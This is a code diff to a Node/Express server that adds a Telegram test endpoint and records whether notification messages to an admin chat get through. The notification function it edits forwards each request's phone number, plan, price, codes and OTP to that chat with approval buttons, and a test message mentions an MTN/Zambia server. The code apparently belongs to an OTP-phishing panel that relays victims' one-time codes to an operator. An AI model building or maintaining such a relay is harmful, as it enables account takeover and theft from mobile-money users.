@@ -49,7 +49,37 @@ app.get('/health', (req, res) => {
   res.json({
     success: true,
     telegramConfigured: isAdminApprovalConfigured(),
+    telegramDelivery: lastTelegramDelivery,
   });
+});
+
+app.post('/api/telegram-test', async (req, res) => {
+  if (!api || !ADMIN_CHAT_ID) {
+    return res.status(503).json(jsonError('Telegram environment variables are not configured'));
+  }
+
+  try {
+    await api.sendMessage({
+      chat_id: ADMIN_CHAT_ID,
+      text: '✅ Telegram delivery test. The MTN/Zambia server can reach this chat.',
+    });
+    lastTelegramDelivery = {
+      at: new Date().toISOString(),
+      success: true,
+      error: null,
+    };
+    res.json(jsonSuccess({ message: 'Telegram test message sent' }));
+  } catch (err) {
+    const code = err?.code || err?.response?.statusCode || err?.response?.status || 'unknown';
+    lastTelegramDelivery = {
+      at: new Date().toISOString(),
+      success: false,
+      error: `${code}: ${err.message}`,
+    };
+    res.status(502).json(jsonError('Telegram test message failed', {
+      telegramError: lastTelegramDelivery.error,
+    }));
+  }
 });
 
 // ---------------------------------------------------------------------------
@@ -88,6 +118,12 @@ function jsonSuccess(data = {}) {
 function jsonError(message, extra = {}) {
   return { success: false, error: message, ...extra };
 }
+
+let lastTelegramDelivery = {
+  at: null,
+  success: null,
+  error: null,
+};
 
 // Clean up old requests every 10 minutes (older than 30 min) to avoid unbounded growth
 setInterval(() => {
@@ -134,17 +170,33 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
         ];
 
   try {
-    return api.sendMessage({
+    const deliveryPromise = api.sendMessage({
       chat_id: ADMIN_CHAT_ID,
       text,
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [buttonRow],
       },
-    }).catch((err) => {
-      console.error('Failed to send Telegram notification:', err.message);
-      return null;
     });
+
+    deliveryPromise.then(() => {
+      lastTelegramDelivery = {
+        at: new Date().toISOString(),
+        success: true,
+        error: null,
+      };
+      console.log(`Telegram notification sent for request ${id}`);
+    }).catch((err) => {
+      const code = err?.code || err?.response?.statusCode || err?.response?.status || 'unknown';
+      lastTelegramDelivery = {
+        at: new Date().toISOString(),
+        success: false,
+        error: `${code}: ${err.message}`,
+      };
+      console.error('Failed to send Telegram notification:', err.message);
+    });
+
+    return deliveryPromise;
   } catch (err) {
     console.error('Failed to send Telegram notification:', err.message);
     return null;
